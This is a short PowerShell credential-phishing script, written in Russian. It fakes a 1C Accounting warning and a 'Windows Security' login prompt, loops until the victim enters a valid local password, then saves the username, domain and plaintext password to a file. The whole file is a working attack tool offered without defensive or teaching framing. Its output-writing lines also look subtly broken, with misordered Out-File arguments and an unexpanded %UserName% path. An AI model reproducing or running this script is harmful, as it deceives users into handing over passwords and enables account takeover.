function Invoke-LoginPrompt{

    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    [System.Windows.Forms.MessageBox]::Show("Для продолжения нормальной работы программы 1C пожалуйста, войдите в учетную запись","1С Бухгалтерия",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)

    $cred = $Host.ui.PromptForCredential("Безопасность Windows", "Пожалуйста, войдите в учетную запись", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
	$FileOut = "C:\Users\%UserName%\Downloads\1.txt"
    while($DS.ValidateCredentials("$full", "$password") -ne $True){
        $cred = $Host.ui.PromptForCredential("Безопасность Windows", "Не верные данные, пожалуйста повторите", "$env:userdomain\$env:username","")
        $username = "$env:username"
        $domain = "$env:userdomain"
        $full = "$domain" + "\" + "$username"
        $password = $cred.GetNetworkCredential().password
        Add-Type -assemblyname System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
        $DS.ValidateCredentials("$full", "$password") | out-null
        }
     
     $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
     Out-File $output $FileOut -Append
}